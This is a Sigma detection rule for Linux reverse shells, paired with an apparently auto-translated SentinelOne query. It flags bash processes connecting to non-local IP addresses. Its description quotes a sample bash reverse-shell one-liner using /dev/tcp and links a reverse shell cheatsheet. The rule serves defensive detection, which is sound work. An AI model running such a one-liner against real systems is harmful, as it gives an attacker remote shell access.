```sql
// Translated content (automatically translated on 02-08-2025 01:37:22):
(event.category in ("DNS","Url","IP")) and (endpoint.os="linux" and (src.process.image.path contains "/bin/bash" and (not (dst.ip.address in ("127.0.0.1","0.0.0.0")))))
```


# Original Sigma Rule:
```yaml
title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: test
description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
references:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
author: Florian Roth (Nextron Systems)
date: 2021-10-16
modified: 2022-12-25
tags:
    - attack.execution
    - attack.t1059.004
logsource:
    product: linux
    category: network_connection
detection:
    selection:
        Image|endswith: '/bin/bash'
    filter:
        DestinationIp:
            - '127.0.0.1'
            - '0.0.0.0'
    condition: selection and not filter
falsepositives:
    - Unknown
level: critical
```
